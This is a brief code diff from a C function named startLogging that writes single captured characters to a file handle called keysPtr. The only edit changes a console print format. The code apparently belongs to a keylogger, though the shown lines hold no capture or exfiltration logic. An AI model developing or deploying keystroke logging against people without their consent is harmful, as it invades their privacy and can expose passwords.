@@ -67,7 +67,7 @@ void startLogging(){
                         str[1] = '\0';
                         text = str;
                         fprintf(keysPtr, "%s", text);
-                        printf("Logged %s \n", text);
+                        printf("Logged: %s \n", text);
                 }
                 
             }
